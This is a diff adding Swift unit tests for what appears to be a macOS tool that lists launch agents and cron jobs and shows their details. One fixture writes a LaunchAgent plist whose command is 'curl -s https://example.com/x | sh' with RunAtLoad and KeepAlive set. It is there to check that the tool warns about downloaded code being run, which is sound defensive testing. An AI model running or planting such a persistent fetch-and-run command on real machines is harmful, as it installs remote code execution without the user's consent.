@@ -250,6 +250,44 @@ final class TriggerTests: TempHomeTestCase {
         XCTAssertEqual(jobs.first?.schedule, "0 3 * * *")
     }
 
+    func testDetailTextSkipsEmptyValues() {
+        let text = DetailText.lines([("Name", "Updater"), ("Label", ""), ("Program", "  "), ("Notes", "One\nTwo")])
+        XCTAssertEqual(text, "Name: Updater\nNotes: One Two")
+        XCTAssertEqual(DetailText.lines([]), "")
+        XCTAssertEqual(DetailText.lines([("Name", "")]), "")
+    }
+
+    func testTriggerHoverDetails() {
+        let path = home + "/Library/LaunchAgents/com.example.updater.plist"
+        try? FileManager.default.createDirectory(atPath: home + "/Library/LaunchAgents", withIntermediateDirectories: true)
+        FileManager.default.createFile(atPath: path, contents: plist([
+            "Label": "com.example.updater",
+            "ProgramArguments": ["/bin/sh", "-c", "curl -s https://example.com/x | sh"],
+            "RunAtLoad": true, "KeepAlive": true,
+        ]))
+        let item = Triggers.launchItem(kind: .userAgent, path: path, overrides: ["com.example.updater": false])!
+        let lines = DetailText.lines(item.detailFields).components(separatedBy: "\n")
+        XCTAssertEqual(lines.first, "Name: com.example.updater")
+        XCTAssertTrue(lines.contains("Kind: Launch Agents for You"))
+        XCTAssertFalse(lines.contains { $0.hasPrefix("Label:") }, "The label is the name, so it isn't repeated")
+        XCTAssertTrue(lines.contains("Program: /bin/sh"))
+        XCTAssertTrue(lines.contains("Command: /bin/sh -c curl -s https://example.com/x | sh"))
+        XCTAssertTrue(lines.contains("File: ~/Library/LaunchAgents/com.example.updater.plist"))
+        XCTAssertTrue(lines.contains("For: Just you"))
+        XCTAssertTrue(lines.contains("Status: Off"))
+        XCTAssertTrue(lines.contains { $0.hasPrefix("Warnings: ") && $0.contains("Downloads or unpacks code and runs it") })
+        XCTAssertTrue(lines.contains("Notes: Starts again whenever it stops"))
+        XCTAssertFalse(lines.contains { $0.hasPrefix("Cron Line:") }, "Empty values are skipped")
+
+        let job = Triggers.cronJobs("*/5 * * * * /usr/local/bin/backup --now\n").first!
+        let cron = DetailText.lines(job.detailFields).components(separatedBy: "\n")
+        XCTAssertTrue(cron.contains("Command: /usr/local/bin/backup --now"))
+        XCTAssertTrue(cron.contains("Cron Line: */5 * * * * /usr/local/bin/backup --now"))
+        XCTAssertTrue(cron.contains("File: Your crontab"))
+        XCTAssertTrue(cron.contains("Status: On"))
+        XCTAssertFalse(cron.contains { $0.hasPrefix("Label:") })
+    }
+
     func testRestoringARemovedCronJobTwiceAddsItOnce() throws {
         let fake = home + "/crontab"
         let saved = Triggers.crontab
